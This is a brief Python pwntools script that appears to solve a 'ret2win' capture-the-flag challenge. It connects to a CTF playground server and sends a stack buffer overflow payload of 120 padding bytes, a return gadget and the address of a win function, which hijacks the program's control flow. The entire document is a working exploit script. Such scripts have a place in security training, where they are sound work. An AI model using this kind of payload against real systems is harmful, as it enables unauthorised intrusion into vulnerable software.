from pwn import *
p = remote("playground.tcp1p.team",19000)
elf = context.binary = ELF("./ret2win")
# p = process()
offset = 120
addr = p64(0x0000000000401216)
payload = b"A" * offset + p64(0x000000000040101a) + addr
write("payload",payload)
p.sendline(payload)
print(p.recvall())
